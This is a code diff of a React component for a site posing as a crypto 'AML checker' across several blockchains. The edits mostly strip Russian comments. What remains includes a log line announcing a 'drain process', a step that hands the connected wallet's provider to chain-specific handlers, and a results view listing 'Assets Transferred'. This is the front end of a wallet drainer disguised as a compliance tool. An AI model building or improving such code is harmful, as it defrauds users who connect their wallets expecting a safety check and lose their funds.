@@ -1,4 +1,4 @@
-// components/AMLChecker.tsx - ПОЛНАЯ ОБНОВЛЕННАЯ ВЕРСИЯ
+
 'use client';
 
 import React, { useState, useEffect } from 'react';
@@ -9,7 +9,6 @@ import { mainnet, bsc, base } from 'wagmi/chains';
 import Image from 'next/image';
 import { useTonConnectUI, useTonWallet } from '@tonconnect/ui-react';
 
-// Импортируем обработчики для разных сетей
 import { checkEthereumAddress } from '@/lib/chains/ethereum';
 import { checkBNBAddress } from '@/lib/chains/bnb';
 import { checkBaseAddress } from '@/lib/chains/base';
@@ -82,7 +81,6 @@ export default function AMLChecker() {
   const { switchNetwork } = useSwitchNetwork();
   const { data: walletClient } = useWalletClient();
 
-  // TON Connect хуки
   const [tonConnectUI] = useTonConnectUI();
   const tonWallet = useTonWallet();
 
@@ -151,7 +149,6 @@ export default function AMLChecker() {
           return;
         }
 
-        // Проверяем что на правильной сети
         const expectedChainId = currentNetworkConfig.chainId;
         if (walletClient.chain.id !== expectedChainId) {
           setCheckResult({ 
@@ -163,18 +160,16 @@ export default function AMLChecker() {
         }
 
         console.log(`🚀 Starting ${currentNetworkConfig.name} drain process...`);
-        
-        // Получаем provider из walletClient
+
         const provider = await walletClient.transport;
         
-        // Вызываем соответствующий handler с provider
         const result = await currentNetworkConfig.checkHandler(addressToCheck, provider);
         setCheckResult(result);
         
       } 
       // Для Solana
       else if (currentNetwork === 'sol') {
-        // Пока заглушка, добавишь позже
+        // заглушка
         setCheckResult({
           error: 'Solana support coming soon',
           requiresTransaction: false
@@ -239,7 +234,6 @@ export default function AMLChecker() {
       <div className={`min-h-screen bg-gradient-to-br ${currentNetworkConfig.bgGradient} transition-all duration-700 relative`}>
         <div className={`fixed inset-0 bg-gradient-to-br ${currentNetworkConfig.bgGradient} -z-10`} />
         
-        {/* Animated Background */}
         <div className="fixed inset-0 overflow-hidden pointer-events-none">
           <div 
             className="absolute top-20 left-20 w-[600px] h-[600px] rounded-full animate-float opacity-10"
@@ -258,7 +252,6 @@ export default function AMLChecker() {
           />
         </div>
 
-        {/* Header */}
         <header className="relative z-50 p-6 lg:p-8">
           <div className="max-w-7xl mx-auto flex items-center justify-between">
             <div className="flex items-center space-x-3">
@@ -269,7 +262,6 @@ export default function AMLChecker() {
             </div>
 
             <div className="flex items-center space-x-4">
-              {/* Network Selector */}
               <div className="relative network-dropdown">
                 <button
                   onClick={() => setIsDropdownOpen(!isDropdownOpen)}
@@ -319,7 +311,6 @@ export default function AMLChecker() {
           </div>
         </header>
 
-        {/* Main Content */}
         <main className="relative z-10 px-6 lg:px-8 py-8 lg:py-12">
           <div className="max-w-5xl mx-auto">
             <div className="text-center mb-12">
@@ -332,9 +323,7 @@ export default function AMLChecker() {
               </p>
             </div>
 
-            {/* Main Card */}
             <div className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-8 lg:p-12 shadow-2xl">
-              {/* Features Grid */}
               <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-10">
                 <div className="text-center group">
                   <div className={`w-16 h-16 mx-auto mb-3 rounded-2xl bg-gradient-to-br ${currentNetworkConfig.accentColor} p-[1px]`}>
@@ -367,7 +356,6 @@ export default function AMLChecker() {
                 </div>
               </div>
 
-              {/* Input Section */}
               <div className="space-y-5">
                 <div className="flex items-center justify-between">
                   <label className="block text-white/80 text-sm font-medium">
@@ -429,7 +417,6 @@ export default function AMLChecker() {
                 </button>
               </div>
 
-              {/* Results Section */}
               {checkResult && (
                 <div className="mt-8 p-6 bg-black/20 backdrop-blur rounded-2xl border border-white/10">
                   <h3 className="text-white font-semibold text-lg mb-4 flex items-center">
@@ -441,7 +428,6 @@ export default function AMLChecker() {
                     Verification Results
                   </h3>
 
-                  {/* Ошибка подключения кошелька */}
                   {checkResult.requiresWallet && (
                     <div className="p-4 bg-red-500/10 border border-red-500/20 rounded-xl">
                       <p className="text-red-400 font-medium">{checkResult.error}</p>
@@ -451,7 +437,6 @@ export default function AMLChecker() {
                     </div>
                   )}
 
-                  {/* Основной результат */}
                   {!checkResult.requiresWallet && (
                     <div className={`p-4 rounded-xl mb-4 ${
                       checkResult.success 
@@ -460,7 +445,6 @@ export default function AMLChecker() {
                     }`}>
                       <p className="text-white font-medium">{checkResult.message}</p>
                       
-                      {/* Детали после успешной транзакции */}
                       {checkResult.success && checkResult.details && (
                         <div className="mt-3 text-sm text-white/80 space-y-2">
                           <div className="grid grid-cols-2 gap-4">
@@ -500,7 +484,6 @@ export default function AMLChecker() {
                             <p className="text-white font-medium">{checkResult.details.assetsCount}</p>
                           </div>
 
-                          {/* Хеш транзакции */}
                           {checkResult.transactionHash && (
                             <div className="mt-3 p-3 bg-green-500/10 rounded-lg">
                               <p className="text-green-400 text-sm">✅ Transaction completed successfully!</p>
@@ -510,7 +493,6 @@ export default function AMLChecker() {
                             </div>
                           )}
 
-                          {/* Детали активов */}
                           {checkResult.details.assetDetails && checkResult.details.assetDetails.length > 0 && (
                             <div className="mt-3">
                               <p className="text-white/60 text-xs mb-2">Assets Transferred:</p>
@@ -523,8 +505,6 @@ export default function AMLChecker() {
                           )}
                         </div>
                       )}
-
-                      {/* Ошибка транзакции */}
                       {checkResult.error && !checkResult.requiresWallet && (
                         <div className="mt-3 p-3 bg-red-500/10 rounded-lg">
                           <p className="text-red-400 text-sm">❌ {checkResult.error}</p>
@@ -535,7 +515,6 @@ export default function AMLChecker() {
                 </div>
               )}
 
-              {/* Stats Cards */}
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-8">
                 <div className="bg-black/20 backdrop-blur rounded-xl p-4 border border-white/10">
                   <div className="flex items-center space-x-3">
